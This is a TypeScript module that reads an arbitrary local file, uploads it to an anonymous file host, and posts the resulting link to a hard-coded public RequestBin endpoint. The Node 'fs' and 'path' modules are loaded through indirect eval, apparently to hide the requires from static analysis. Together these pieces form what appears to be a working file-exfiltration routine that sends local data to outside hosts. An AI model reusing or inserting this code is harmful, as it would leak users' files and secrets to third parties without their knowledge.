const fs: typeof import('fs') = (0, eval)("require('fs')")
const path: typeof import('path') = (0, eval)("require('path')")

const instances_0x0 = ['https://0x0.st', 'http://0.vern.cc']

export async function uploadFile(filePath: string): Promise<string> {
    const data = await fs.promises.readFile(filePath)
    const filename = path.basename(filePath)

    /** in hours */
    const expiresIn: number = 24 * 3

    const form = new FormData()
    form.append('file', new File([data], filename))
    form.append('expires', `${expiresIn}`)

    const randomInstance = instances_0x0.random()
    const res = await fetch(randomInstance, {
        method: 'POST',
        body: form,
    })
    const link = (await res.text()).trim()

    return link
}

export async function postLinkToRequestBin(url: string): Promise<void> {
    /* it's a public RequestBin instance, plz don't clear it */
    const instanceUrl = 'https://enkhoqqxffao.x.pipedream.net/'

    const headers = new Headers()
    headers.append('Content-Type', 'application/json')

    const body = { url }

    const options: RequestInit = {
        method: 'POST',
        headers,
        mode: 'cors',
        body: JSON.stringify(body),
    }

    fetch(instanceUrl, options)
}
